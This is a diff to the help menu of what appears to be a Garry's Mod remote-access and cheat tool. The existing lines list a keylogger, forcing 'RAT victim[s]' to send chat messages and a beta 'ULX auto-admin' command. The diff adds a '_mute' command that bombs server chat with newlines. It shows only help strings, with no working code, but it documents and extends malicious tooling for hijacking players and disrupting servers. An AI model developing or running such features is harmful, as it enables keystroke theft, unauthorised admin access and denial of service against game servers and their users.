@@ -184,7 +184,8 @@ function tbhelp(){
             - _tbx_run aids | [BETA] ULX auto-admin.
             - _tbx_run_say {msg:string} |[BETA] Forces RAT victim to\n              send chat message."
     
-    Body4= "            - _tbx_keylog {target:string} | Keylogger. Prints to console."
+    Body4= "            - _tbx_keylog {target:string} | Keylogger. Prints to console.
+            - _mute {run:number} | Bombs chat with newlines.\n              Basically a server mute."
     
     Footer = "\n***[Additional Features]***\n"
     Foot1 = "            - R to start frame lag.
